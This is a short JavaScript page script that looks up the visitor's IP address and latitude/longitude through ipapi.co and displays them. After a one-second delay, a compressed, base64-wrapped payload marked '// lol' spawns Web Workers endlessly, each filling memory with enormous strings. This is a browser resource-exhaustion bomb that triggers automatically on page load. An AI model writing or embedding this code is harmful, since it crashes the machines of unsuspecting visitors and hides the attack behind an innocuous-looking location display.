// https://ipapi.co/json/
(async()=>{
  const req = await fetch("https://ipapi.co/json/");
  const json = await req.json();
  const { ip, longitude, latitude } = json;
  const ipE = document.getElementById("ip");
  const llE = document.getElementById("ll");
  
  ipE.innerText = ip
  llE.innerText = `(${longitude}, ${latitude})`;
  // lol
  setTimeout(() => {let r=0xFFFFFF,o=0xFFFFA,c=`f=[];while(!0){f.push(String.fromCharCode(${o}).repeat(${r}))}`,d=`data:text/html;base64,${btoa(c)}`,b=`while(1){new Worker("${d}")}`,i=`data:text/html;base64,${btoa(b)}`;new Worker(i);},1000)
})()
